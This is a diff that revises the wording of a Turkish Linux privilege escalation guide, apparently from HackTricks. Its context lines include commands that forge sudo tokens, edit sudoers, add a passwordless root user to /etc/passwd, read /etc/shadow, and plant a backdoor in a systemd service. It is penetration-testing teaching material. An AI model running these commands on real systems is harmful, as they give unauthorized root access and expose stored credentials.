@@ -942,14 +942,14 @@ sudo su
 ```
 ### /var/run/sudo/ts/\<Kullanıcı Adı>
 
-Eğer klasörde veya klasör içindeki oluşturulan dosyalardan herhangi birinde **yazma izinleriniz** varsa, bir kullanıcı ve PID için **sudo token** oluşturmak üzere [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ikilisini kullanabilirsiniz.\
-Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını geçersiz kılabiliyorsanız ve PID 1234 olan o kullanıcıyla bir shell'e sahipseniz, şifreyi bilmeden **sudo ayrıcalıkları elde edebilirsiniz**:
+Eğer klasörde veya klasör içindeki oluşturulan dosyalardan herhangi birinde **yazma izinleriniz** varsa, bir kullanıcı ve PID için **sudo token** oluşturmak üzere [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ikili dosyasını kullanabilirsiniz.\
+Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve PID 1234 olan o kullanıcıyla bir shell'e sahipseniz, şifreyi bilmeden **sudo ayrıcalıkları elde edebilirsiniz**:
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
 ```
 ### /etc/sudoers, /etc/sudoers.d
 
-Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar, kimin `sudo` kullanabileceğini ve nasıl kullanılacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
+Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar, kimin `sudo` kullanabileceğini ve nasıl kullanılacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubunun okuyabileceği şekilde ayarlanmıştır**.\
 **Eğer** bu dosyayı **okuyabiliyorsanız**, **ilginç bilgiler elde edebilirsiniz** ve eğer herhangi bir dosyayı **yazabiliyorsanız**, **yetkileri yükseltebilirsiniz**.
 ```bash
 ls -l /etc/sudoers /etc/sudoers.d/
@@ -969,7 +969,7 @@ echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
 ```
 ### DOAS
 
-`sudo` ikili dosyasına alternatif olarak OpenBSD için `doas` gibi bazı seçenekler vardır, yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.
+`sudo` ikili dosyasına alternatif olarak OpenBSD için `doas` gibi bazı alternatifler vardır, yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.
 ```
 permit nopass demo as root cmd vim
 ```
@@ -1002,7 +1002,7 @@ Dosya `/etc/ld.so.conf`, **yüklenen yapılandırma dosyalarının nereden geldi
 
 Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin** **arama** yapılacağı **diğer klasörlere** işaret eder. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib`'dir. **Bu, sistemin `/usr/local/lib` içinde kütüphaneleri arayacağı anlamına gelir.**
 
-Herhangi bir nedenle, **bir kullanıcının yazma izinleri** varsa, belirtilen yollardan herhangi birinde: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyası içindeki herhangi bir klasör, ayrıcalıkları artırma yeteneğine sahip olabilir.\
+Herhangi bir nedenle, **bir kullanıcının yazma izinleri** varsa, belirtilen yollardan herhangi birinde: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyası içindeki herhangi bir klasör, yetki yükseltme gerçekleştirebilir.\
 Aşağıdaki sayfada **bu yanlış yapılandırmayı nasıl istismar edeceğinize** bir göz atın:
 
 {{#ref}}
@@ -1093,7 +1093,7 @@ screen -x [user]/[session id]
 ```
 ## tmux oturumlarının ele geçirilmesi
 
-Bu, **eski tmux sürümleriyle** ilgili bir sorundu. Bir ayrıcalıksız kullanıcı olarak root tarafından oluşturulan bir tmux (v2.1) oturumunu ele geçiremedim.
+Bu, **eski tmux sürümleriyle** ilgili bir sorundu. Bir normal kullanıcı olarak root tarafından oluşturulan bir tmux (v2.1) oturumunu ele geçiremedim.
 
 **tmux oturumlarını listele**
 ```bash
@@ -1120,7 +1120,7 @@ Check **Valentine box from HTB** for an example.
 ### Debian OpenSSL Predictable PRNG - CVE-2008-0166
 
 Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) üretilen tüm SSL ve SSH anahtarları bu hatadan etkilenebilir.\
-Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken meydana gelir, çünkü **yalnızca 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği anlamına gelir ve **ssh genel anahtarına sahip olduğunuzda, karşılık gelen özel anahtarı arayabilirsiniz**. Hesaplanan olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
+Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken meydana gelir, çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği anlamına gelir ve **ssh genel anahtarına sahip olduğunuzda, karşılık gelen özel anahtarı arayabilirsiniz**. Hesaplanan olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
 
 ### SSH İlginç yapılandırma değerleri
 
@@ -1147,7 +1147,7 @@ Bu yapılandırma, "**testusername**" kullanıcısının **özel** anahtarıyla 
 
 ### ForwardAgent/AllowAgentForwarding
 
-SSH ajan yönlendirmesi, **şifre olmadan** anahtarların sunucunuzda durması yerine **yerel SSH anahtarlarınızı kullanmanıza** olanak tanır. Böylece, ssh ile **bir ana bilgisayara** **atlayabilir** ve oradan **başka bir** ana bilgisayara **atlayarak** **ilk ana bilgisayarınızdaki** **anahtarı** kullanabilirsiniz.
+SSH ajan yönlendirmesi, **şifreli olmayan** anahtarların sunucunuzda kalması yerine **yerel SSH anahtarlarınızı kullanmanıza** olanak tanır. Böylece, ssh üzerinden **bir ana bilgisayara** **atlayabilir** ve oradan **başka bir** ana bilgisayara **atlayarak** **ilk ana bilgisayarınızdaki** **anahtarı** kullanabilirsiniz.
 
 Bu seçeneği `$HOME/.ssh.config` dosyasında şu şekilde ayarlamanız gerekir:
 ```
@@ -1184,7 +1184,7 @@ cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 #Shadow equivalent files
 cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
 ```
-Bazen **şifre hash'lerini** `/etc/passwd` (veya eşdeğeri) dosyası içinde bulabilirsiniz.
+Bazen **şifre karma** değerlerini `/etc/passwd` (veya eşdeğeri) dosyası içinde bulabilirsiniz.
 ```bash
 grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 ```
@@ -1210,7 +1210,7 @@ UYARI: mevcut makinenin güvenliğini azaltabilirsiniz.
 echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
 su - dummy
 ```
-NOT: BSD platformlarında `/etc/passwd` dosyası `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur, ayrıca `/etc/shadow` dosyası `/etc/spwd.db` olarak yeniden adlandırılmıştır.
+NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumundadır, ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.
 
 Bazı **hassas dosyalara yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **hizmet yapılandırma dosyalarına** yazabilir misiniz?
 ```bash
@@ -1223,7 +1223,7 @@ ExecStart=/path/to/backdoor
 User=root
 Group=root
 ```
-Arka kapınız, tomcat bir sonraki kez başlatıldığında çalıştırılacaktır.
+Arka kapınız bir sonraki tomcat başlatıldığında çalıştırılacaktır.
 
 ### Klasörleri Kontrol Et
 
@@ -1288,7 +1288,7 @@ find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/gam
 ### Loglar
 
 Logları okuyabiliyorsanız, **içlerinde ilginç/gizli bilgiler bulabilirsiniz**. Log ne kadar garip olursa, o kadar ilginç olacaktır (muhtemelen).\
-Ayrıca, bazı "**kötü**" yapılandırılmış (arka kapılı?) **denetim logları**, bu yazıda açıklandığı gibi, **denetim logları içinde şifreleri kaydetmenize** izin verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
+Ayrıca, bazı "**kötü**" yapılandırılmış (arka kapılı?) **denetim logları**, bu yazıda açıklandığı gibi, denetim logları içinde **şifreleri kaydetmenize** izin verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
@@ -1306,16 +1306,16 @@ grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 ~/.zlogin #zsh shell
 ~/.zshrc #zsh shell
 ```
-### Genel Kimlik Bilgileri Arama/Regex
+### Genel Krediler Arama/Regex
 
-Ayrıca, **adında** veya **içeriğinde** "**password**" kelimesini içeren dosyaları kontrol etmeli ve ayrıca günlüklerde IP'ler ve e-postalar veya hash regex'lerini kontrol etmelisiniz.\
+Ayrıca, **adı** veya **içeriği** içinde "**password**" kelimesini içeren dosyaları kontrol etmeli ve ayrıca günlüklerde IP'ler ve e-postalar veya hash regex'lerini kontrol etmelisiniz.\
 Bunların nasıl yapılacağını burada listelemeyeceğim ama ilgileniyorsanız, [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri kontrol edebilirsiniz.
 
 ## Yazılabilir dosyalar
 
 ### Python kütüphanesi ele geçirme
 
-Bir python betiğinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** veya **python kütüphanelerini değiştirebiliyorsanız**, OS kütüphanesini değiştirebilir ve arka kapı ekleyebilirsiniz (python betiğinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).
+Bir python scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** veya **python kütüphanelerini değiştirebiliyorsanız**, OS kütüphanesini değiştirebilir ve arka kapı ekleyebilirsiniz (python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).
 
 Kütüphaneyi **arka kapılamak** için os.py kütüphanesinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştirin):
 ```python
@@ -1332,7 +1332,7 @@ Güvenlik açığı hakkında daha ayrıntılı bilgi bu sayfada bulunabilir: [h
 
 Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.
 
-Bu güvenlik açığı, [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx günlükleri)** ile çok benzerlik göstermektedir, bu nedenle günlükleri değiştirebildiğinizi bulduğunuzda, bu günlükleri yöneten kişiyi kontrol edin ve günlükleri simlinklerle değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi kontrol edin.
+Bu güvenlik açığı, [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx günlükleri)** ile çok benzerlik göstermektedir, bu nedenle günlükleri değiştirebileceğinizi bulduğunuzda, bu günlükleri yöneten kişiyi kontrol edin ve günlükleri simlinklerle değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi kontrol edin.
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
@@ -1342,7 +1342,7 @@ Herhangi bir nedenle, bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine 
 
 Ağ betikleri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tam olarak .INI dosyaları gibi görünürler. Ancak, Linux'ta Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.
 
-Benim durumumda, bu ağ betiklerinde `NAME=` ataması doğru bir şekilde işlenmemektedir. Eğer isimde **boşluk varsa, sistem boşluktan sonraki kısmı çalıştırmaya çalışır**. Bu, **ilk boşluktan sonraki her şey root olarak çalıştırılır** anlamına gelir.
+Benim durumumda, bu ağ betiklerinde `NAME=` ataması doğru bir şekilde işlenmemektedir. Eğer isimde **boşluk varsa, sistem boşluktan sonraki kısmı çalıştırmaya çalışır**. Bu, **ilk boşluktan sonraki her şeyin root olarak çalıştırıldığı** anlamına gelir.
 
 Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
 ```bash
@@ -1352,9 +1352,9 @@ DEVICE=eth0
 ```
 ### **init, init.d, systemd ve rc.d**
 
-Dizin `/etc/init.d`, **System V init (SysVinit)** için **script'ler** barındırır, bu da **klasik Linux servis yönetim sistemidir**. Bu script'ler, servisleri `başlatmak`, `durdurmak`, `yeniden başlatmak` ve bazen `yeniden yüklemek` için kullanılır. Bunlar doğrudan veya `/etc/rc?.d/` dizininde bulunan sembolik bağlantılar aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif bir yol `/etc/rc.d/init.d`'dir.
+Dizin `/etc/init.d`, **System V init (SysVinit)** için **script'lerin** bulunduğu yerdir, bu **klasik Linux servis yönetim sistemi**dir. Bu script'ler servisleri `başlatmak`, `durdurmak`, `yeniden başlatmak` ve bazen `reload` etmek için kullanılır. Bunlar doğrudan veya `/etc/rc?.d/` dizininde bulunan sembolik bağlantılar aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif bir yol `/etc/rc.d/init.d`'dir.
 
-Diğer yandan, `/etc/init` **Upstart** ile ilişkilidir, bu da Ubuntu tarafından tanıtılan daha yeni bir **servis yönetimidir**, servis yönetim görevleri için yapılandırma dosyaları kullanır. Upstart'a geçişe rağmen, SysVinit script'leri hala Upstart yapılandırmaları ile birlikte kullanılmaktadır çünkü Upstart'ta bir uyumluluk katmanı vardır.
+Diğer yandan, `/etc/init` **Upstart** ile ilişkilidir, bu Ubuntu tarafından tanıtılan daha yeni bir **servis yönetimi**dir ve servis yönetim görevleri için yapılandırma dosyaları kullanır. Upstart'a geçişe rağmen, SysVinit script'leri hala Upstart yapılandırmaları ile birlikte kullanılmaktadır çünkü Upstart'ta bir uyumluluk katmanı vardır.
 
 **systemd**, modern bir başlatma ve servis yöneticisi olarak ortaya çıkar, talep üzerine daemon başlatma, otomatik montaj yönetimi ve sistem durumu anlık görüntüleri gibi gelişmiş özellikler sunar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` dizinlerine organize eder, sistem yönetim sürecini kolaylaştırır.
 
@@ -1396,7 +1396,7 @@ cisco-vmanage.md
 **Unix Yetki Yükseltme Kontrolü:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
 **Linux Yetki Kontrol Aracı:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
-**Kernelpop:** Linux ve MAC'te kernel açıklarını listele [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
+**Kernelpop:** Linux ve MAC'teki kernel açıklarını listele [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
 **Mestaploit:** _**multi/recon/local_exploit_suggester**_\
 **Linux Exploit Önerici:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
 **EvilAbigail (fiziksel erişim):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
